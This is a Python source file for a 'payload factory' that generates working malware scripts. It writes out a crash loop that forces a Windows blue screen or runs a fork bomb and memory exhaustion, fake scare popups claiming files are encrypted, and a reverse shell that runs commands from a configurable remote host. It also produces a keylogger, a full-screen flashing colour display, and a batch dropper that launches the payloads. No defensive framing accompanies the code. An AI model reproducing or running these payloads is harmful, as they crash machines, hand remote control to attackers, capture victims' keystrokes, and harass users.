#!/usr/bin/env python3
"""Payload factory — crash, popup, control skeletons"""

from pathlib import Path
import time
import base64
import textwrap

class PayloadFactory:
    def __init__(self, out_dir: Path):
        self.out_dir = Path(out_dir)
        self.out_dir.mkdir(parents=True, exist_ok=True)

    def crash_loop(self, name="crash_loop.py"):
        code = textwrap.dedent('''\
        import os, sys, time, ctypes, random
        def bsod_win():
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except Exception:
                while True:
                    os.fork() if hasattr(os, "fork") else None
                    x = [0]*10**7
        def fork_bomb():
            while True:
                try:
                    os.fork()
                except Exception:
                    pass
        def mem_eat():
            a = []
            while True:
                a.append("X"*10**7)
        if sys.platform.startswith("win"):
            bsod_win()
        else:
            try:
                fork_bomb()
            except Exception:
                mem_eat()
        ''')
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def random_popups(self, name="popup_spam.py", count=50):
        code = textwrap.dedent(f'''\
        import sys, time, random, threading
        try:
            import tkinter as tk
            from tkinter import messagebox
        except Exception:
            tk = None
        msgs = [
            "Your system is compromised",
            "Updating drivers... do not power off",
            "Critical security alert",
            "Bitcoin miner started",
            "All your files are encrypted",
            "Press OK to continue (or don't)",
            "Kernel panic simulated",
            "Nice try",
        ]
        def spam():
            if not tk:
                print("no tk")
                return
            root = tk.Tk()
            root.withdraw()
            for _ in range({count}):
                try:
                    messagebox.showerror("ALERT", random.choice(msgs))
                    time.sleep(random.uniform(0.3, 1.2))
                except Exception:
                    break
            root.destroy()
        if __name__ == "__main__":
            spam()
        ''')
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def reverse_shell(self, host="127.0.0.1", port=4444, name="revshell.py"):
        code = textwrap.dedent(f'''\
        import socket, subprocess, os, sys, time
        HOST = "{host}"
        PORT = {port}
        def connect():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    while True:
                        data = s.recv(4096).decode(errors="ignore")
                        if data.lower() in ("exit", "quit"):
                            break
                        if data.startswith("cd "):
                            try:
                                os.chdir(data[3:].strip())
                                s.send(b"ok\\n")
                            except Exception as e:
                                s.send(str(e).encode() + b"\\n")
                            continue
                        proc = subprocess.Popen(data, shell=True,
                                                 stdout=subprocess.PIPE,
                                                 stderr=subprocess.PIPE,
                                                 stdin=subprocess.PIPE)
                        out = proc.stdout.read() + proc.stderr.read()
                        s.send(out or b"\\n")
                    s.close()
                except Exception:
                    time.sleep(5)
        if __name__ == "__main__":
            connect()
        ''')
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def keylogger(self, name="keylog.py", outfile="keys.txt"):
        code = textwrap.dedent(f'''\
        # requires pynput: pip install pynput
        from pynput import keyboard
        import time
        LOG = "{outfile}"
        def on_press(key):
            try:
                k = key.char
            except AttributeError:
                k = str(key)
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(f"{{time.time()}}: {{k}}\\n")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
        ''')
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def screen_spam(self, name="screen_spam.py"):
        code = textwrap.dedent('''\
        import sys, time, random
        try:
            import tkinter as tk
        except Exception:
            sys.exit(0)
        colors = ["#ff0000", "#00ff00", "#0000ff", "#ffff00", "#ff00ff", "#00ffff"]
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        canvas = tk.Canvas(root, highlightthickness=0)
        canvas.pack(fill="both", expand=True)
        def flash():
            canvas.configure(bg=random.choice(colors))
            root.after(80, flash)
        flash()
        root.mainloop()
        ''')
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def dropper_bat(self, py_file: str, name="dropper.bat"):
        code = f'''@echo off
python "{py_file}"
if errorlevel 1 py "{py_file}"
pause
'''
        p = self.out_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def list_generated(self):
        return list(self.out_dir.glob("*"))
